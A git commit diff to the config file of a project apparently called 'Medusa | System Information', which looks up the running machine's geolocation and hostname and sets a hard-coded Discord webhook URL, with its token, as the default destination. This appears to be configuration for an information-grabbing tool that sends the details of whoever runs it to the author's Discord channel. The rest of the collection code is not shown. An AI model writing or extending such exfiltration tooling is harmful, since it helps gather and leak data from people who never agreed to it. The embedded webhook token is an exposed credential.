2799f17c8eb9f5b19d4e8d15d28f19681b45c113
Hydoxl <hugoheinzel42@gmail.com>
2023-10-05 16:00:56 +0200

    modified:   src/config.py

--- src/config.py
+++ src/config.py
@@ -1,11 +1,12 @@
 import geo
+import user_info
 
 latlng = geo.get_location()
 
 # set default values
 DEFAULT_COLOR = int("000000", 16)
 DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1155245923958542406/9ACUH8lAu7vkwckvBi9IMQBDgx6H84C7vuALrlxc55inQduo1ACnPB9t6FFRol8JePOj"
-USERNAME = "Medusa | System Information"
+USERNAME = f"{user_info.get_hostname()} | System Information"
 IMAGE_URL = "https://cdn.discordapp.com/avatars/648508571734245376/a_04f5199ee21d38b6aac9cd7381675efe.jpeg"
 
 # webhook configuration
